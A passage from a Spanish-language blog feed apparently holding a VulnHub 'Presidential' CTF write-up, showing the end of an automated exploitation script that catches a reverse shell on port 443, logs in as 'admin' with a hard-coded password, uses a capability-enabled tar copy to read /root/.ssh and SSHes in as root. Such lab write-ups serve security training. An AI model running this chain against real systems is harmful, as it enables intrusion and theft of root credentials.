+    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">session_PhpPyAdmin</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">()).</span><span class="n">start</span><span class="p">()</span>
+    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">error</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+    
+    <span class="n">shell</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="mi">443</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">20</span><span class="p">).</span><span class="n">wait_for_connection</span><span class="p">()</span>
+    
+
+    <span class="k">if</span> <span class="n">shell</span><span class="p">.</span><span class="n">sock</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">failure</span><span class="p">(</span><span class="s">"No se ha obtenido ninguna conexión"</span><span class="p">)</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Se ha obtenido una conexión"</span><span class="p">)</span>
+        <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Acceso al sistema como usuario apache"</span><span class="p">)</span>
+        <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="n">p3</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"Escalación de privilegios"</span><span class="p">)</span>
+    <span class="n">p3</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">"Iniciando como el usuario admin"</span><span class="p">)</span>
+    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="c1">#shell.sendline(b"script /dev/null -c bash")
+</span>    <span class="n">shell</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"su admin"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">shell</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Password:"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">shell</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"Stella"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    
+    <span class="n">p3</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">"Obteniendo shell como root"</span><span class="p">)</span>
+    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="n">shell</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"cd"</span><span class="p">)</span>
+    <span class="n">shell</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"tarS -cf comprimido.tar /root/.ssh &amp;&gt;/dev/null"</span><span class="p">)</span>
+    <span class="n">shell</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"tarS -xf comprimido.tar &amp;&gt;/dev/null"</span><span class="p">)</span>
+    <span class="n">shell</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"ssh -i root/.ssh/id_rsa root@localhost -p 2082"</span><span class="p">)</span>
+    <span class="n">p3</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Pwned!!"</span><span class="p">)</span>
+    <span class="n">shell</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="ejecución-del-autopwn">Ejecución del AutoPwn</h2>
+<p><br />
+<img src="/assets/images/vulnHub/presidential_1/AutoPwn.png" alt="" /></p>]]></content><author><name>Kysk3</name></author><category term="VulnHub" /><category term="Autopwn" /><category term="Scripting" /><category term="Web Enumeration" /><category term="Information Leakage" /><category term="Virtual Hosting" /><category term="Abusing phpMyAdmin" /><category term="Pentesting" /><category term="Abusing Capabilities" /><summary type="html"><![CDATA[Presidential es una máquina ideal para empezar: toca cosas básicas de pentesting y te obliga a practicar la enumeración web.]]></summary></entry></feed>
